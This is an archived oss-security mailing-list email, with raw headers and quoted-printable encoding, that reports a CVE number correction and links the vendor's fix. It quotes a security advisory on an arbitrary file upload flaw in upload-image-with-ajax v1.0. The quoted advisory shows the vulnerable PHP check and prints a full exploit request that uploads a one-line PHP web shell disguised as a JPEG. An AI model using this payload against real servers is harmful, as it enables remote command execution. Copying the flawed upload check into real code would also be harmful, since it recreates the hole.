X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2495" "Monday" "23" "December" "2019" "16:52:05" "-0500" "Larry W. Cashdollar" "larry0@me.com" nil "81" nil "^Date:" nil nil "12" nil nil (number mark "        larry0@me.co Dec 23   81/2495  " thread-indent "\"[oss-security] Re: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Re: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 1612 invoked by uid 550); 23 Dec 2019 21:52:20 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 1594 invoked from network); 23 Dec 2019 21:52:20 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=1a1hai;
	t=1577137927; bh=mk1BMjoKvSW/DCY6d0bb91IivFgeKCsejexd0K6ZotI=;
	h=Date:Subject:From:To:Message-ID:Content-type;
	b=HVhMTDaVJRIOVL2/Jj/RtVq+pYHRzvpqKNBaohHPpf8tzw2bg5Px3k6TrX2np5Ets
	 fND0L8ZhxDWsLF2trBt92P96aNuKQZtvOSi/cIoGbN7jahr0GwnN6hcwRQGx+rEThQ
	 7SvcXC/a2W45myUWKVpoVCniBoUO3DJf5fwgW8FDLcNhoB/lXWvD13bqPJ5fAN+sm9
	 Vp2BH0UBNAtruioEbLlzSo0gEmeFNWL6DRDUdawcJarkgKeBZEzAqveCt8upjqi8KH
	 J+13bi1RUEZLai8ZzWearssjL2q4ZeUyKUAs5F+fZqmQNMlfKWdFvTM1pnZ22whEMI
	 oWDsyfrM5Ijkw==
User-Agent: Microsoft-MacOutlook/10.20.0.191208
Message-ID: <3894D4AF-10B8-46F7-BAF5-C800F8FCFE20@me.com>
Thread-Topic: Arbitrary file upload vulnerability in upload-image-with-ajax
 v1.0
References: <BA02B4C0-17B0-4625-ABC8-FA6F52379002@me.com>
In-Reply-To: <BA02B4C0-17B0-4625-ABC8-FA6F52379002@me.com>
Mime-version: 1.0
Content-type: text/plain;
	charset="UTF-8"
Content-transfer-encoding: quoted-printable
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,, definitions=2019-12-23_09:,,
 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0 malwarescore=0
 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
 mlxlogscore=787 adultscore=0 classifier=spam adjust=0 reason=mlx
 scancount=1 engine=8.0.1-1908290000 definitions=main-1912230190
Date: Mon, 23 Dec 2019 16:52:05 -0500
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: Arbitrary file upload vulnerability in upload-image-with-ajax
 v1.0
To: Open Security <oss-security@lists.openwall.com>

Hello,

An update and a correction.

The CVE number should be CVE-2019-8293.  The software author also has fixed=
 the vulnerability:

https://github.com/abcprintf/upload-image-with-ajax/commit/71436ba510201039=
7519d4b25ea57591cfb4974c

Thanks,
Larry

=EF=BB=BFOn 12/23/19, 12:09 PM, "Larry W. Cashdollar" <larry0@me.com> wrote:

    Title: Arbitrary file upload vulnerability in upload-image-with-ajax
    Author: Larry W. Cashdollar
    Date: 2019-12-16
    CVE-ID:[CVE-2019-8292]
    Download Site: https://github.com/abcprintf/upload-image-with-ajax/
    Vendor: adcprintf
    Vendor Notified: 2019-12-16
    Vendor Contact: wh.cprintf@gmail.com
    Advisory: http://www.vapidlabs.com/advisory.php?v=3D211
    Description: upload-image-with-ajax
    Vulnerability:
    The code below changes the $ready flag to true if the file conforms to =
the size of < 1000000. Reversing the check that the file is an image. So, a=
 .php file can be uploaded with only a warning allowing code execution.
=20=20=20=20
    $ready =3D false;
    if((($imageType =3D=3D "image/jpeg") || ($imageType =3D=3D "image/jpg")=
 || ($imageType =3D=3D "image/png"))&&in_array($fileExt, $validext)){
    $ready =3D true;
    }else{
    echo "was not an image
    ";
    /You should abort the upload right here/
    }
    if($_FILES["fileUpload"]["size"] < 1000000){
    $ready =3D true;
    echo "file size is ".$_FILES['fileUpload']["size"]."
    ";
    }else{
    echo "file was TOO BIG!";
    }
=20=20=20=20
    Exploit Code:
     $ ./fileupload_exploit 192.168.0.3 80 /upload-image-with-ajax/upload.p=
hp
    POST request size is 469 bytes
=20=20=20=20=20
    Sending Payload:
    POST //upload-image-with-ajax/upload.php HTTP/1.1
    Host: 192.168.0.3
    User-Agent: File Upload Exploiter/v1.2
    Accept: */*
    Content-Length: 237
    Content-Type: multipart/form-data; boundary=3D------------------------c=
8e05c8871143853
=20=20=20=20=20
    --------------------------c8e05c8871143853
    Content-Disposition: form-data; name=3D"fileUpload"; filename=3D"shell.=
jpg"
    Content-Type: image/jpeg
=20=20=20=20=20
    <?php $cmd=3D$_GET['cmd']; system($cmd);?>
=20=20=20=20=20
    --------------------------c8e05c8871143853--
=20=20=20=20=20
    HTTP/1.1 200 OK
    Date: Mon, 16 Dec 2019 04:39:56 GMT
    Server: Apache/2.4.25 (Debian)
    Content-Length: 37
    Content-Type: text/html; charset=3DUTF-8
=20=20=20=20=20
    file size is 42<br>upload successful!
    [+] Total bytes read: 185
=20=20=20=20


